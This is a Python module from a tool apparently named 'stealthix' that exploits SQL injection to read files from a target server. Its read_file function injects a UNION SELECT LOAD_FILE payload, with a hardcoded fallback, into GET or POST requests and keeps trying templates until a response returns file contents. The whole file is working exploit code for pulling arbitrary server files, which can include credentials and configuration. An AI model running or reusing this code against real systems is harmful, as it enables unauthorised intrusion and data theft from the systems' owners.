from __future__ import annotations

from typing import Any

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _finalize_text_result,
    _get_extraction_profile,
    _looks_like_db_error,
    _make_request,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)


def read_file(session: ScanSession, path: str) -> dict[str, Any]:
    profile = _get_extraction_profile(session, "files") or {}
    if profile.get("disabled") is True:
        result = _result_base(session, "files", [])
        result["content"] = ""
        result["path"] = path
        result["warnings"].append("File extraction is disabled for the active extraction profile.")
        return result
    templates = profile.get("payloads") if isinstance(profile.get("payloads"), list) else []
    candidates = templates or ["' UNION SELECT LOAD_FILE('{path}')--"]
    payloads: list[str] = []
    results = _result_base(session, "files", payloads)
    results["path"] = path
    results["content"] = ""
    for template in candidates:
        try:
            raw = str(template).format(path=path)
        except Exception:
            raw = f"' UNION SELECT LOAD_FILE('{path}')--"
        payload = _prepare_payload(session, raw)
        payloads.append(payload)
        if method_uses_body(session.config.method):
            target, data = _apply_injection(session, payload)
            body, elapsed = _make_request(session, target, data, "POST")
        else:
            target, _ = _apply_injection(session, payload)
            body, elapsed = _make_request(session, target)
        results["responses"].append(_response_entry(target, payload, body, elapsed, limit=10000))
        results["content"] = body
        if body.strip() and not _looks_like_db_error(body):
            _record_success(results, payload)
            break
    return _finalize_text_result(results, "content")
